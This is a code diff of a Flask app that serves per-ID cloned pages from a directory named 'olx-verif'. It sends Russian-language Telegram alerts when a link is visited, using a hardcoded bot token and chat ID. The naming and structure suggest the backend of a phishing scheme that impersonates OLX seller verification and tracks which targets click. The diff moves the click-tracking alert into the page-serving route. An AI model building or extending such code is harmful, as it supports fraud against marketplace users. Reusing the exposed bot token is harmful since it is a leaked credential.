@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template_string, send_from_directory, redirect
+from flask import Flask, request, jsonify, render_template_string, send_from_directory
 import os
 import shutil
 from bs4 import BeautifulSoup
@@ -6,22 +6,13 @@ import requests
 
 app = Flask(__name__)
 
-TELEGRAM_BOT_TOKEN = '7216530203:AAHo7UsufnSII67aV1ZINQ91OV1TL_WjaSw'
-TELEGRAM_CHAT_ID = '6958729639'
+BOT_TOKEN = '7216530203:AAHo7UsufnSII67aV1ZINQ91OV1TL_WjaSw'
+CHAT_ID = '6958729639'
 
-def send_telegram_message(link_id, seller_name_tag):
-    message = f"Переход по ссылке\nlink_id: {link_id}\nseller_name_tag: {seller_name_tag}"
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {
-        'chat_id': TELEGRAM_CHAT_ID,
-        'text': message,
-        'parse_mode': 'HTML'
-    }
-    try:
-        response = requests.post(url, data=payload)
-        response.raise_for_status()
-    except requests.exceptions.RequestException as e:
-        print(f"Ошибка при отправке сообщения в Telegram: {e}")
+def send_telegram_message(chat_id, text):
+    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
+    payload = {'chat_id': chat_id, 'text': text}
+    requests.post(url, data=payload)
 
 @app.route('/verif/<random_id>', methods=['POST'])
 def save_page(random_id):
@@ -84,19 +75,9 @@ def save_page(random_id):
 @app.route('/merchant/<random_id>')
 def serve_merchant_page(random_id):
     merchant_path = f"/var/www/olx-verif/merchant/{random_id}"
+    # Send a message to the user when they visit the link
+    send_telegram_message(CHAT_ID, f"Переход по ссылке {random_id}")
     return send_from_directory(merchant_path, 'index.html')
-
-@app.route('/track/<random_id>', methods=['GET'])
-def track_link(random_id):
-    seller_name_tag = request.args.get('seller_name_tag')
-    if not seller_name_tag:
-        return jsonify({'error': 'Missing seller_name_tag'}), 400
-
-    # Отправка уведомления в Telegram
-    send_telegram_message(random_id, seller_name_tag)
-
-    # Перенаправление на нужную страницу
-    return redirect(f'/verif/{random_id}')
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
